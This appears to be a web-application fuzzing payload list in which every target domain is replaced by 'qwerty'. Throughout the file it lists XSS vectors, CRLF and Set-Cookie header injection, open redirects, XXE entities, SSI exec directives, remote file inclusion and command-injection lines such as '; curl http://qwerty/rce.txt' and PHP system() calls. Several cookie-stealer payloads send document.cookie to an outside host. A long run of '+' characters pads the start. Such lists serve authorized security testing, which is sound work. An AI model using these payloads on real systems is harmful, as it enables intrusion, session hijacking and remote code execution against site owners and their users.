+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++set-Cookie: qwertyXXXXXXXXX;
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++set-Cookie: qwertyXXXXXXXXX;
+.qwerty
+.www.qwerty
+.qwerty
+.xss.qwerty
+/%09/www.qwerty
+/%09/qwerty
+/%0aSet-Cookie: qwerty%0aX:/%2e%2e/tr
+/%0aSet-Cookie: qwerty%0aX:/%2e%2e/tr
+/%2fwww.qwerty/%2e%2e
+/%2fwww.qwerty/%2e%2e/
+/%2fwww.qwerty/%2e%2e/ƒ
+/%2fwww.qwerty/%2e%2e
+/%2fwww.qwerty/%2e%2e/
+/* qwerty
+/* qwerty 
+// qwerty
+//////www.qwerty/%2e%2e/
+//////www.qwerty/%2e%2e/tr
+//////www.qwerty/%2e%2e/
+//////www.qwerty/%2e%2e/tr
+//qwerty
+//qwerty%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20222%0d%0a<script>alert%28%27qwerty%27%29<%2fscript>%0d%0a%0d%0a
+//qwerty%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20222%0d%0a<script>alert%28%27qwerty%27%29<%2fscript>%0d%0a%0d%0a
+//www.qwerty
+//www.qwerty/
+//www.qwerty/%2E%2E
+//www.qwerty/%2E%2E%0aSet-Cookie: qwerty=qwerty
+//www.qwerty/%2E%2E%0aSet-Cookie: x=qwerty
+//www.qwerty/%2E%2E%0d%0a%20Set-Cookie: qwerty=qwerty
+//www.qwerty/%2E%2E%0d%0a%20Set-Cookie: x=qwerty
+//www.qwerty/%2E%2E%0dSet-Cookie: qwerty=qwerty
+//www.qwerty/%2E%2E%0dSet-Cookie: x=qwerty
+//www.qwerty/.testing/rfi_vuln.php
+//www.qwerty/.testing/rfi_vuln.php%00
+//www.qwerty/
+//www.qwerty/%2E%2E
+//www.qwerty/%2E%2E%0aSet-Cookie: qwerty=qwerty
+//www.qwerty/%2E%2E%0aSet-Cookie: x=qwerty
+//www.qwerty/%2E%2E%0d%0a%20Set-Cookie: qwerty=qwerty
+//www.qwerty/%2E%2E%0d%0a%20Set-Cookie: x=qwerty
+//www.qwerty/%2E%2E%0dSet-Cookie: qwerty=qwerty
+//www.qwerty/%2E%2E%0dSet-Cookie: x=qwerty
+//qwerty
+//qwerty/.testing/rfi_vuln.php
+//qwerty/.testing/rfi_vuln.php%00
+//xss.qwerty
+//|\\ <script //|\\ src='https://dl.qwerty/u/13018058/js.js'> //|\\ </script //|\\
+/\/\www.qwerty
+/\/\qwerty
+/\www.qwerty
+/\www.qwerty/%2e%2e/
+/\www.qwerty/%2e%2e/
+/\qwerty
+/profiles.php?what=contact&author=ich&authoremail=bla%40qwerty&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+/www.qwerty
+/www.qwerty/%2E%2E
+/www.qwerty/%2E%2E
+/x/<img/onerror='alert(qwerty)'src=x>/../../
+/x/<img/onerror='alert(qwerty)'src=x>/../../
+/qwerty
+1111111'"></qwerty>();\//--># <!--
+111111111111111111111111111111111"><script>alert(qwerty)</script>111111111111111111111111111111111111111111111111111111111111111111111111111
+; curl http://qwerty/rce.txt
+; curl https://qwerty/.testing/rce_vuln.txt
+; system('curl https://qwerty/.testing/rce_vuln.txt');
+; wget http://qwerty/rce.txt
+; wget https://qwerty/.testing/rce_vuln.txt
+<!-- qwerty
+<!-- qwerty -->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://qwerty/xss.js></SCRIPT>'"-->
+<!--#exec cmd="curl http://qwerty/.testing/rfi_vuln.php" -->
+<!--#include virtual="http://qwerty/.testing/rfi_vuln.php" -->
+<!--#include virtual="https://qwerty/.testing/rfi_vuln.php" -->
+<!--<img src="--><img src=x onerror=alert(1)//">//qwerty
+<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "http://qwerty/.testing/rfi_vuln.txt"> ]>
+</INJECT>
+</qwerty>(qwerty)
+</qwerty>alert=(qwerty)'"-- \\-->
+</script><script src="http://qwerty/.testing/xss.js?script_src=1">//qwerty
+</script><script src="https://qwerty/.testing/xss.js?script_src=1">//qwerty
+</textarea><iframe src=http://qwerty/.testing/xss_vuln.html onload=prompt(7) onmouseover=alert(8) onerror=prompt(9)><!--//*qwerty
+</textarea><iframe src=https://qwerty/.testing/xss_vuln.html onload=prompt(25) onmouseover=alert(26) onerror=prompt(27)><!--//*qwerty
+<;A HREF=";//www.qwerty/";>;XSS<;/A>;
+<;A HREF=";http://qwerty/";>;XSS<;/A>;
+<;A HREF=";http://www.gohttp://www.qwerty/ogle.com/";>;XSS<;/A>;
+<;A HREF=";http://www.qwerty./";>;XSS<;/A>;
+<;A HREF=";javascript:document.location=';http://www.qwerty/';";>;XSS<;/A>;
+<;IMG SRC=";http://qwerty/somecommand.php?somevariables=maliciouscode";>;
+<<scr\0ipt/src=http://qwerty/xss.js></script
+<?php system("curl https://qwerty/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://qwerty/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("wget https://qwerty/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://qwerty/.testing/rce_vuln.txt?req=jdfj2jc");?>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "https://qwerty/.testing/rfi.txt" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://qwerty/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://qwerty/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://qwerty/</string></value></param><param><value><string>http://qwerty</string></value></param></params></methodCall>
+<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM "https://qwerty/.testing/rfi_vuln.txt">%f5a30; ]>
+<A HREF="//www.qwerty/">XSS</A>
+<A HREF="http://qwerty/">XSS</A>
+<A HREF="http://www.gohttp://www.qwerty/ogle.com/">XSS</A>
+<A HREF="http://www.qwerty./">XSS</A>
+<A HREF="javascript:document.location='http://www.qwerty/'">XSS</A>
+<EMBED SRC="http://qwerty/xss.swf" AllowScriptAccess="always">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://qwerty/xss.htc"><xss:xss>XSS</xss:xss></html>
+<HTML xmlns:xss><?import namespace="xss" implementation="https://qwerty/.testing/xss.html"><xss:xss>XSS</xss:xss></HTML>
+<IFRAME SRC=”http://qwerty/xss.html”>
+<IMG SRC="http://qwerty/somecommand.php?somevariables=maliciouscode">
+<qwerty><!-- //qwerty -->
+<OBJECT TYPE="text/x-scriptlet" DATA="http://qwerty/xss.html">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://qweerty/scriptlet.html"></object>
+<SCRIPT SRC=http://qwerty/xss.js></SCRIPT>
+<a href="javascript:alert(1)" onmouseover=alert(1)>qwerty HOVER</a>
+<a onclick="javascript:document.location='http://qwerty/.testing/iframe_injection.php?cookie='+document.cookie;">qwerty COOKIE STEALER!</a>
+<a onclick="javascript:document.location='https://qwerty/.testing/iframe_injection.php?cookie='+document.cookie;">qwerty COOKIE STEALER!</a>
+<audio onerror="javascript:alert(1)"><source>//qwerty
+<button form=test onformchange=alert(1)>//qwerty
+<div style="binding: url(http://qwerty/xss.js);"> [Mozilla]
+<embed src="http://qwerty/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<embed src="http://qwerty/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
+<font color=red><h1>@qwerty<iframe src=http://qwerty/.testing/xss_vuln.html height=100% width=100% onload=prompt(10) onmouseover=alert(11) onerror=prompt(12)>
+<font color=red><h1>@qwerty<iframe src=https://qwerty/.testing/xss_vuln.html height=100% width=100% onload=prompt(28) onmouseover=alert(29) onerror=prompt(30)>
+<form><button formaction="javascript:alert(1)">//qwerty
+<h1/onclick=alert(1)>a//qwerty
+<h1>qwerty</h1>
+<h1\>qwerty</h1\>
+<h1\>qwerty</h1\>
+<iframe src="http://qwerty/.testing/iframe_injection.php?iframe_src=3" height="100%" width="100%"></iframe>//qwerty
+<iframe src="http://qwerty/.testing/xss_vuln.html"></iframe>//qwerty
+<iframe src="https://qwerty/.testing/iframe_injection.php?iframe_src=3" height="0" width="0"></iframe>//qwerty
+<iframe src="https://qwerty/.testing/iframe_injection.php?iframe_src=4" height="100%" width="100%"></iframe>//qwerty
+<iframe src="https://qwerty/.testing/xss_vuln.html"></iframe>//qwerty
+<iframe src=http://qwerty/.testing/xss_vuln.html onload=prompt(4) onmouseover=alert(5) onerror=prompt(6)><!--//*qwerty
+<iframe src=https://qwerty/.testing/xss_vuln.html onload=prompt(22) onmouseover=alert(23) onerror=prompt(24)><!--//*qwerty
+<iframe width="420" height="315" src="https://qwerty/embed/5LlQNty_C8s?autoplay=1" frameborder="0" allowfullscreen></iframe>
+<iframe width="420" height="315" src="https://qwerty/embed/iUXAHc-ABoY?autoplay=1" frameborder="0" allowfullscreen></iframe>
+<iframe width="560" height="315" src="https://qwerty/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allowfullscreen></iframe>
+<iframe/onload=alert(/qwerty/)>
+<img onload=alert(1)>//qwerty
+<img src="http://31.qwerty/ae3ef754917fe39e9c1fec441c553c85/tumblr_nsa8jqTm7i1resp2ko1_500.gif"></img>
+<img src="http://38.qwerty/809d39daf44dd25ef7ce77706e44e953/tumblr_nuvz98USdD1resp2ko1_500.gif"></img>
+<img src="http://38.qwerty/tumblr_ls64yimLuz1r0ix14o1_400.gif"></img>
+<img src="http://38.qwerty/tumblr_m5who6JOEM1rna86e.gif"></img>
+<img src="http://qwerty/.testing/xss.png?img_src=2"></img>//qwerty
+<img src="http://qwerty/.testing/xss.png?img_src_onerror_prompt" onerror=prompt(1) onload=prompt(2) onmouseover=prompt(3)>//qwerty
+<img src="http://qwerty/.testing/xss.png?img_src_onerror_prompt" onerror=window.location("http://135.23.158.130/.testing/xss.html");>//qwerty
+<img src="https://qwerty/.testing/xss.png?img_src=2 onerror=prompt(16) onload=prompt(17) onmouseover=prompt(18)"></img>//qwerty
+<img src="https://qwerty/.testing/xss.png?img_src_onerror_prompt" onerror=prompt(19) onload=prompt(20) onmouseover=prompt(21)>//qwerty
+<img src="https://qwerty/.testing/xss.png?img_src_onerror_prompt" onerror=window.location("http://135.23.158.130/.testing/xss.html");>//qwerty
+<img src="https://qwerty.com/bYmdHcX.gif"></img>
+<img src=http://qwerty/.testing/xss.png>//qwerty REMOTE
+<img src=https://qwerty/.testing/xss.png onerror=prompt(13) onload=prompt(14) onmouseover=prompt(15)>//qwerty REMOTE
+<img src=x onerror=prompt(1)>//qwerty
+<img/src='http://qwerty/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<img/src='x'onerror=alert(1)>//qwerty
+<input autofocus onfocus=alert(1)>//qwerty
+<keygen autofocus onfocus=alert(1)>//qwerty
+<marguee/onstart=alert(1)>//qwerty
+<marquee loop=1 width=0 onfinish=alert(1)>//qwerty<img src=http://qwerty/.testing/xss.png>//qwerty REMOTE
+<marquee loop=1 width=0 onfinish=alert(1)>//qwerty<img src=https://qwerty/.testing/xss.png onerror=prompt(13) onload=prompt(14) onmouseover=prompt(15)>//qwerty REMOTE
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://qwerty" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<meta HTTP-EQUIV="Link" Content="<http://qwerty/xss.css>; REL=stylesheet">
+<meta name="octolytics-host" content="collector.qwerty" /><meta name="octolytics-app-id" content="github" /><meta name="octolytics-event-url" content="https://collector.qwerty/github-external/browser_event" /><meta name="octolytics-dimension-request_id" content="E2E6:29B7:52E1543:97BC7F3:5B5871BC" /><meta name="octolytics-dimension-region_edge" content="iad" /><meta name="octolytics-dimension-region_render" content="iad" />
+<object data="http://qwerty/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<object data="http://qwerty/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+<p/onclick=alert(/qwerty/)>a
+<script "a='>'" SRC="http://qwerty/xss.js"></script>
+<script =">" SRC="http://qwerty/xss.js"></script>
+<script SRC="http://qwerty/xss.jpg"></script>
+<script a=">" '' SRC="http://qwerty/xss.js"></script>
+<script a=">" SRC="http://qwerty/xss.js"></script>
+<script a=">'>" SRC="http://qwerty/xss.js"></script>
+<script a=`>` SRC="http://qwerty/xss.js"></script>
+<script src="http://qwerty/.testing/xss.js?script_src=1"></script>//qwerty
+<script src="https://qwerty/.testing/xss.js?script_src=1"></script>//qwerty
+<script src=http://qwerty/your_files.js></script>
+<script+src=">"+src="http://qwerty/xss.js?69,69"></script>
+<script/&Tab; src='https://dl.qwerty/u/13018058/js.js' /&Tab;></script>
+<script>$=1,alert($)</script>//qwerty
+<script>alert(1)//qwerty
+<script>alert(1)<!--qwerty
+<script>document.write("<SCRI");</SCRIPT>PT SRC="http://qwerty/xss.js"></script>
+<script>location.href='http://qwerty/.testing/iframe_injection.php?'+document.cookie;</script>//qwerty
+<select autofocus onfocus=alert(1)>//qwerty
+<style>@import'http://qwerty/xss.css';</style>
+<style>BODY{-moz-binding:url("http://qwerty/xssmoz.xml#xss")}</style>
+<svg onload=(alert)(1) >//qwerty
+<svg/onload=alert(/qwerty/)>
+<svg/onload=alert(1)>//qwerty
+<svg/onload=alert(`qwerty`)>
+<svg/onload=alert`qwerty`>
+<svg><script x:href='https://dl.qwerty/u/13018058/js.js' {Opera}
+<svg><script xlink:href=data&colon;,window.open('https://www.qwerty/') </script
+<svg><script xlink:href=data&colon;,window.open('https://www.qwerty/')></script
+<svg><script>/<@/>alert(1)</script>//qwerty
+<textarea autofocus onfocus=alert(1)>//qwerty
+<video onerror="javascript:alert(1)"><source>//qwerty
+<video><source onerror="javascript:alert(1)">//qwerty
+<xml SRC="https://qwerty/.testing/rfi_vuln.txt" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+<xml SRC="https://qwerty/.testing/xss.html" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://qwerty/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "https://qwerty/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://qwerty/?sid="%2bdocument.cookie)>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://qwerty/channel/UC9Qa_gXarSmObPX3ooIQZr
+Baiduspider ( http://qwerty/search/spider.htm)
+CrowdShield XSS Agent"><script/src=https://qwerty/.testing/useragent.js>
+INJECT "'`();</test>=/* <!-- // #
+INJECT"'();</>=/*<!--#//
+qwerty
+qwerty%0Aqwerty%3Dqwerty%0A
+qwerty%0D%0Aqwerty%3Dqwerty%0D%0A
+qwerty%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%0a%0a
+qwerty%0aSet-Cookie: INJECT=qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
+qwerty%0d%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fqwerty%2F.testing%2Fiframe_injection.php%0d%0d%0a%0a
+qwerty%0dXTest%3Aqwerty
+qwerty%250aXTest%3Aqwerty
+qwerty%27%22%3c%3e%2e%2e
+qwerty%27%22%3c%3e%2e%2e/
+qwerty'"<>
+qwerty'"<>/%2e%2e
+qwerty'"<>/%2e%2e/
+qwerty'"></INJECT>(qwerty)
+qwerty'"></qwerty>();\//--># <!--
+qwerty/%2e%2e
+qwerty/%2e%2e/
+qwertyXXXXXXXX
+qwertyXXXXXXXXqwertyXXXXXXXX
+qwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXX
+qwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXX
+qwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXX
+qwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXXqwertyXXXXXXXX
+qwertyXXXXXXXXXX
+qwertyXXXXXXXXXX "'`();</test>=/* <!-- // #
+qwertyXXXXXXXXXXXXXXXXXXXXXXXXX
+qwertyXXXXXXXXXXXXXXXXXXXXXXXXXX"><script>alert(qwerty)</script>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+'"></qwerty>(qwerty)
+Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.qwerty/bot.html)
+qwerty%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%0a%0a
+qwerty%0aSet-Cookie: INJECT=qwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
+qwerty%0d%0aSet-Cookie%3AINJECT%3DqwertyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fwww.qwerty%2F.testing%2Fiframe_injection.php%0d%0d%0a%0a
+qwerty%0dXTest%3Aqwerty
+qwerty%250aXTest%3Aqwerty
+qwerty%27%22%3c%3e%2e%2e
+qwerty%27%22%3c%3e%2e%2e/
+qwerty'"<>
+qwerty'"<>/%2e%2e
+qwerty'"<>/%2e%2e/
+qwerty/%2e%2e
+qwerty/%2e%2e/
+Redirect 302 /a.jpg http://qwerty/admin.asp&;deleteuser
+Redirect 302 /a.jpg http://qwerty/admin.asp&amp;deleteuser
+Redirect 302 /a.jpg http://qwerty/admin.asp&deleteuser
+\/\/www.qwerty
+\/\/qwerty
+\/www.qwerty
+\/www.qwerty/
+\/www.qwerty/%2e%2e/
+\/www.qwerty/
+\/www.qwerty/%2e%2e/
+\/qwerty
+\\www.qwerty
+\\qwerty
+\nqwerty
+\nqwerty\n\n
+\nqwerty
+\nqwerty\n\n
+\n\nqwerty
+\n\nqwerty
+\n\rqwerty
+\n\rqwerty\n\r
+\n\rqwerty\n\r\n\r
+\n\rqwerty
+\n\rqwerty\n\r
+\n\rqwerty\n\r\n\r
+\necho qwerty\nexit\n\033[2Acurl https://qwerty/.testing/rce_vuln.txt\n
+\necho qwerty\nexit\n\033[2Asleep 5\n
+\necho qwerty\nexit\n\033[2Awget https://qwerty/.testing/rce_vuln.txt\n
+alert(1)>//qwerty
